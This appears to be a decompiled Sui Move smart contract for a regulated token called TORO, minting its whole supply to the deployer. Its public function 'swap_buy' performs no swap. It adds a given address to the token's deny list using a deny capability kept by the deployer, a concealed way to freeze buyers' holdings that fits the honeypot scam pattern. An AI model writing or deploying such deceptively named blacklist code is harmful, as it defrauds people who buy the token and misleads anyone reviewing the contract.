module 0x4b90286cc1391b29d0896695214b8b0c4e53296820a8b415a47c57e4990683d4::toro {
    struct TORO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TORO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TORO>(arg0, 9, b"TORO", b"Toro Inoue", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://gateway.pinata.cloud/ipfs/QmT8dHU9pcoz7xd2XaBba8bwSzhCZsZzdHYtxBhFsCAwXC"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TORO>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TORO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TORO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TORO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TORO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TORO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

